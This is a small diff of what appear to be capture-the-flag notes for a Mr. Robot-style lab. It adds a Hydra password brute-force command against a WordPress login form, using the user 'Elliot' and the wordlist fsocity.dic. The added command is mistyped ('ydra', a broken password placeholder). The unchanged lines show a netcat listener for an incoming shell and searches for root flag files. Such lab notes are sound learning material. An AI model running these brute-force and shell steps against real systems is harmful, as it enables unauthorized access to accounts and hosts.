@@ -56,4 +56,5 @@ find / -type f -name root*.txt
 nc -vnlp 1234
 /root/root.txt
 
+ydra -l Elliot -P fsocity.dic `cat alvo` http-post-form "/wp-login.php;log=^USER^&pwd=^PA^:The password you entered for the username" -f
 
